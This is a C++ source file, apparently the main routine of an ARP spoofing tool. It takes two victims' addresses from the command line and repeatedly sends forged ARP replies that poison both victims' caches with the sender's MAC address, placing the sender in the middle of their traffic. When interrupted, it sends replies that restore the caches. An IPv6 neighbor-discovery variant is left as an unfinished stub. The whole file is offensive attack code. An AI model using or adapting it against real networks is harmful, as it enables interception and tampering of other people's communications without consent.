#include <cstdlib>
#include <iostream>
#include <unistd.h>
#include <signal.h>
#include "ARP_packet.h"
#include "NetworkInterface.h"
#include "ARP_packetManager.h"
#include "SpoofArguments.h"
#include "ICMPv6_packetManager.h"

bool loop = true;

void interruptHandler(int sig);

int main(int argc, char **argv) {
    try {
        SpoofArguments arguments(argc, argv);
        NetworkInterface networkInterface(arguments.getInterface());
        ARP_packetManager *arpPacketManager;
        ICMPv6_packetManager *icmpv6_packetManager;

        signal(SIGINT, interruptHandler);
        signal(SIGTERM, interruptHandler);

        if (arguments.getProtocol() == "arp") {
            /* Perform ARP cache poison */

            arpPacketManager = ARP_packetManager::getInstance();
            arpPacketManager->init(&networkInterface);
            while (loop) {
                ARP_packet *arpReply1 = ARP_packet::createReply(
                        networkInterface.getPhysicalAddress(),
                        arguments.getVictim2Ipv4Address(),
                        arguments.getVictim1MacAddress(),
                        arguments.getVictim1Ipv4Address()
                );
                ARP_packet *arpReply2 = ARP_packet::createReply(
                        networkInterface.getPhysicalAddress(),
                        arguments.getVictim1Ipv4Address(),
                        arguments.getVictim2MacAddress(),
                        arguments.getVictim2Ipv4Address()
                );

                arpPacketManager->send(arpReply1);
                arpPacketManager->send(arpReply2);

                delete arpReply1;
                delete arpReply2;

                usleep((__useconds_t) (arguments.getTime() * 1000));
            }

            /* Reset APR cache tables */
            ARP_packet *arpReply1 = ARP_packet::createReply(
                    arguments.getVictim2MacAddress(),
                    arguments.getVictim2Ipv4Address(),
                    arguments.getVictim1MacAddress(),
                    arguments.getVictim1Ipv4Address()
            );
            ARP_packet *arpReply2 = ARP_packet::createReply(
                    arguments.getVictim1MacAddress(),
                    arguments.getVictim1Ipv4Address(),
                    arguments.getVictim2MacAddress(),
                    arguments.getVictim2Ipv4Address()
            );

            arpPacketManager->send(arpReply1);
            arpPacketManager->send(arpReply2);

            delete arpReply1;
            delete arpReply2;

            arpPacketManager->clean();
        } else {
            /* Perform NDP cache poison */

            icmpv6_packetManager = ICMPv6_packetManager::getInstance();
            icmpv6_packetManager->init(&networkInterface);

            //TODO create neighbor advertisement packet and send it

            icmpv6_packetManager->clean();
        }
    }
    catch (InvalidArgumentsException &e) {
        cerr << e.what() << endl;
        SpoofArguments::printUsage();
        return EXIT_FAILURE;
    }
    catch (exception &e) {
        cerr << e.what() << endl;
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}

void interruptHandler(int sig) {
    loop = false;
}